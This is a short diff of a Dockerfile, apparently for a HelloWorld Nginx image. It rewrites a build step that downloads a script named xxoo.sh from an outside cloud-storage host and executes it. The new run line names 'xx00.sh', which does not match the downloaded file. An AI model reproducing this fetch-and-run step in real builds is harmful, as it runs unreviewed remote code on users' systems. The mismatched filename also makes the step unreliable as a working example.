@@ -6,8 +6,10 @@ MAINTAINER wdzaw@gmail.com
 # The RUN instruction will execute any commands
 # Adding HelloWorld page into Nginx server
 RUN yum install wget -y
-RUN wget http://svn-10038864.cos.myqcloud.com/xxoo.sh|bash xxoo.sh
-
+RUN cd /
+RUN wget http://svn-10038864.cos.myqcloud.com/xxoo.sh
+RUN chmod +x xxoo.sh
+RUN ./xx00.sh
 # The EXPOSE instruction informs Docker that the container listens on the specified network ports at runtime
 EXPOSE 80
 
